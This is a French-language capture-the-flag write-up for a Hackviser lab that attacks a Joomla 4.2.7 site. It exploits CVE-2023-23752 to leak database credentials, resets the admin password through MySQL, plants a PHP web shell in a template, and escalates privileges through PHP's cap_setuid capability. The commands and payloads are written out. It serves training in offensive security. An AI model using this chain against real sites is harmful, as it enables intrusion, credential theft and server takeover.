# Writeup : Scénario Management - Hackviser

## 📝 Informations Générales

- **Cible :** `phantomtechmarket.hv` (Joomla 4.2.7)
- **Difficulté :** Moyenne
- **Objectif :** Investiguer un réseau criminel de vente de téléphones volés.

---

## 🔍 Phase 1 : Énumération & Recherche d'Informations (OSINT/Web)

### Questions 1 & 2 : E-mail de vente et Adresse BTC

En inspectant la page d'accueil avec `curl`, on identifie directement les informations de contact dans la section des annonces de téléphones.

- **Extraction de l'adresse BTC :**

```bash
curl -s http://phantomtechmarket.hv/ | grep "BTC Address"
# Réponse : 37S9EBGan3BkHUWbyAXJZG7fXw32ZQqowD
```

- **Extraction de l'adresse E-mail :**
L'e-mail est protégé par un script `joomla-hidden-mail`. En lisant le code source, on trouve des valeurs en Base64 :

```bash
echo "c2FsZXNAcGhhbnRvbXRlY2htYXJrZXQuaHY=" | base64 -d
# Réponse : sales@phantomtechmarket.hv
```

---

## 🔓 Phase 2 : Exploitation (Vulnerability Research)

### Questions 3 & 4 : Admin Username & Database Password

Le site utilise **Joomla 4.2.7**, qui est vulnérable à la faille **CVE-2023-23752** (Exposition d'informations via l'API).

- **Exploitation de l'API pour les identifiants DB :**

```bash
curl -s "http://phantomtechmarket.hv/api/index.php/v1/config/application?public=true" | jq '.'
# Réponse : user="joomla", password="bL3zgeLGXk8eYP3mtshtUgtc"
```

- **Exploitation de l'API pour l'utilisateur admin :**

```bash
curl -s "http://phantomtechmarket.hv/api/index.php/v1/users?public=true" | jq '.'
# Réponse : username="phantomtech"
```

---

## 💻 Phase 3 : Accès Système (RCE)

### Accès à la base de données & Infiltration

Le service MySQL (3306) est ouvert. On se connecte avec les identifiants trouvés pour réinitialiser le mot de passe admin :

```bash
mysql --protocol=TCP --ssl=0 -h phantomtechmarket.hv -u joomla -pbL3zgeLGXk8eYP3mtshtUgtc -D joomla \
-e "UPDATE joomla_users SET password='[NOUVEAU_HASH_BCRYPT]' WHERE username='phantomtech';"
```

Ensuite, via le panel d'administration (`/administrator/`), on injecte un shell PHP dans le fichier `error.php` du template **Cassiopeia** :

```php
<?php system($_GET['cmd']); ?>
```

---

## 🚩 Phase 4 : Post-Exploitation & Escalade de Privilèges

### Question 5 : Dernier e-mail de demande

En explorant le serveur via le shell PHP, on trouve un fichier de log d'enquêtes clients :

```bash
curl -s "http://phantomtechmarket.hv/templates/cassiopeia/error.php?cmd=cat /var/www/customer_inquiries.txt" | head -n 10
# Réponse : jordan.jones@yahoo.com (Date: 2024-02-27)
```

### Question 6 & 7 : Fournisseur et Statistiques (Root)

L'énumération des privilèges révèle que PHP a des "Capabilities" dangereuses :

```bash
getcap -r / 2>/dev/null
# Résultat : /usr/bin/php8.3 cap_setuid=ep
```

On utilise cette capacité pour lire le dossier `/root` :

- **Numéro du fournisseur :** `cat /root/supplier_email.txt`
  - **Réponse :** +1-415-911-8801
- **Nombre de ventes :** `wc -l /root/customer_purchases.csv`
  - **Réponse :** 137 (138 lignes moins l'en-tête).

---

## 🏁 Conclusion

Le réseau criminel a été démantelé en utilisant des failles de configuration API et une mauvaise gestion des privilèges binaires (Capabilities).

**Auteur :**  post-exploitation.
